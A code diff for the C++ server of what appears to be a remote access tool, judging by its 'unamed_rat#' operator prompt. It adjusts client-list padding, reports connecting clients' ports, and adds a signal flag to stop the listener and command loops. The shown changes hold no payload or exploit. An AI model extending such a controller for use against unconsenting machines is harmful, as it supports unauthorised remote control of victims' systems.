@@ -1,6 +1,7 @@
 #include "Server.hpp"
 #include "Misc.hpp"
 #include "Commands.hpp"
+
 void Server::PrintClientList(){
 	if(iClientsOnline <= 0){
 		std::cout<<"\n\tNo clients online\n";
@@ -22,16 +23,16 @@ void Server::PrintClientList(){
 	std::string strPadding = "";
 	std::string strSolidBorder = " +";
 	std::string strCutBorder = " +";
-	strSolidBorder.append(((iMaxLen + 3) * iHeader) -7, '=');
+	strSolidBorder.append(((iMaxLen + 3) * iHeader) -13, '=');
 	strSolidBorder.append(1, '+');
-	strCutBorder.append(((iMaxLen + 3) * iHeader) -7, '-');
+	strCutBorder.append(((iMaxLen + 3) * iHeader) -13, '-');
 	strCutBorder.append(1, '+');
 	std::cout<<strSolidBorder<<'\n';
 	for(int iIt = 0; iIt<iHeader; iIt++){
 		int iTmpSize = vHeaders[iIt].length();
 		strPadding.erase(strPadding.begin(), strPadding.end());
 		if(iIt == 0){
-			strPadding.append((iMaxLen - iTmpSize) - 6, ' ');
+			strPadding.append((iMaxLen - iTmpSize) - 12, ' ');
 		} else {
 			strPadding.append(iMaxLen - iTmpSize, ' ');
 		}
@@ -43,7 +44,7 @@ void Server::PrintClientList(){
 			if(Clients[iIt3]->isConnected){
 				int iTmpSize1 = std::to_string(Clients[iIt3]->iID).length();
 				strPadding.erase(strPadding.begin(), strPadding.end());
-				strPadding.append((iMaxLen - iTmpSize1) -6, ' ');
+				strPadding.append((iMaxLen - iTmpSize1) -12, ' ');
 				std::cout<<" | "<<Clients[iIt3]->iID<<strPadding;
 				iTmpSize1 = Clients[iIt3]->strIP.length();
 				strPadding.erase(strPadding.begin(), strPadding.end());
@@ -791,11 +792,11 @@ int Server::WaitConnection(char*& output){
 	sckTmpSocket = accept(sckMainSocket, (struct sockaddr *)&strctClient, &slC);
 	if(sckTmpSocket != -1){
 		//beej guide network programming
+		struct sockaddr_in *tmp = (struct sockaddr_in *)&strctClient;
 		inet_ntop(strctClient.ss_family, get_int_addr((struct sockaddr *)&strctClient),strIP, sizeof(strIP));
-	
 		int sLen = Misc::StrLen(strIP);
-		output = new char[sLen+1];
-		strncpy(output, strIP, sLen);
+		output = new char[sLen+8];
+		snprintf(output, sLen + 7, "%s:%d", strIP, ntohs(tmp->sin_port));
 	}
 	return sckTmpSocket;
 }
@@ -816,7 +817,7 @@ void Server::threadListener(){
 	//std::cout<<"Listener thread started\n";
 	int iClientCount = 0, uiOldValue = 0;
 	bool uiReachMax = false;
-	while(isReceiveThread){  //receiver loop
+	while(isReceiveThread && !bSignalFlag){  //receiver loop
 		//if reach max connections loop until one disconects
 		usleep(100000); //prevent 100% cpu usage 100 miliseconds
 		if(iClientCount >= Max_Clients){
@@ -896,7 +897,7 @@ void Server::threadListener(){
 //here parse all commands from stdin
 void Server::threadMasterCMD(){
 	std::string strPrompt = "unamed_rat# ";
-	while(1){
+	while(!bSignalFlag){
 		std::string strCMD;
 		std::cout<<strPrompt;
 		std::getline(std::cin, strCMD);
